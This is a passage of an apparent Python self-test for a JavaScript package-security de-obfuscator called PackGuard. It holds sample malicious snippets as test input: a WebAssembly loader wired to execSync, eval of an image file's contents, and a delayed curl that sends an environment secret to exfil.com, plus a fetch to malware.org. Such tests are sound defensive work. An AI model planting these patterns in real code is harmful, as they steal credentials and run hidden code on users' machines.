        # Case 7: T10 WASM Loader Bridge Analysis (F02)
        (
            "T10 WASM Loader Bridge Analysis (F02)",
            """
            const wasmBytes = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]);
            const importObj = { env: { exec: require('child_process').execSync, fetch: fetch } };
            WebAssembly.instantiate(wasmBytes, importObj);
            """,
            "WASM_LOADER_BRIDGE",
            lambda s: s["wasm_bridges"] >= 1,
        ),
        # Case 8: T11 Steganography: Zero-width Unicode & Asset Read to Eval (F03)
        (
            "T11 Steganographic Payload Unfolding (F03)",
            """
            const payload_steg = "\\u200B\\u200C\\u200C\\u200C\\u200B\\u200C\\u200B\\u200C\\u200B\\u200C\\u200C\\u200B\\u200C\\u200B\\u200B\\u200C";
            const imgData = fs.readFileSync(path.join(__dirname, 'badge.png'));
            eval(imgData.toString());
            """,
            "STEGANOGRAPHIC_ASSET_LOADER",
            lambda s: s["steganography_extracted"] >= 1,
        ),
        # Case 9: T12 Time-Bomb & Environment Unfolding (F04)
        (
            "T12 Time-Bomb & Environment Unfolding (F04)",
            """
            setTimeout(function() {
                require('child_process').execSync('curl http://exfil.com?key=' + process.env.SECRET);
            }, 86400000);
            if (process.env.CI) return; else { require('https').get('https://malware.org'); }
            if (Date.now() > 1731196800000) { console.log('detonate'); }
            """,
            "INLINED_TIMER_CALLBACK",
            lambda s: s["timebomb_inlined"] >= 2,
        ),
    ]

    all_passed = True
    print("=" * 70)
    print("[*] Running PackGuard Stage 2 v5 AST De-obfuscator Self-Test...")
    print("=" * 70)

    for i, (name, input_code, expected_snippet, stat_check) in enumerate(test_cases, 1):
        cleaned, stats = deobfuscate_javascript(input_code)
        clean_norm = re.sub(r"\s+", " ", cleaned).strip()
        exp_norm = re.sub(r"\s+", " ", expected_snippet).strip()
        passed_snippet = exp_norm in clean_norm
        passed_stat = stat_check(stats)
        passed = passed_snippet and passed_stat

        if passed:
            print(f"  [+] Test {i:02d}: {name:<45} PASSED")
        else:
            print(f"  [-] Test {i:02d}: {name:<45} FAILED")
            if not passed_snippet:
                safe_exp = exp_norm.encode("ascii", errors="backslashreplace").decode("ascii")
                safe_act = clean_norm[:180].encode("ascii", errors="backslashreplace").decode("ascii")
                print(f"      Expected in: {safe_exp}")
                print(f"      Actual:      {safe_act}...")
            if not passed_stat:
                print(f"      Stat check failed: {stats}")
            all_passed = False

    print("=" * 70)
    if all_passed:
        print("[+] ALL 9 AST DE-OBFUSCATION & EVASION UNFOLDING TESTS PASSED (100%)!")
    else:
        print("[-] SOME TESTS FAILED!")
    print("=" * 70)
    return all_passed


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] in ("--test", "-t", "--self-test"):
        success = run_self_test()
        sys.exit(0 if success else 1)
    success = run_self_test()
    sys.exit(0 if success else 1)
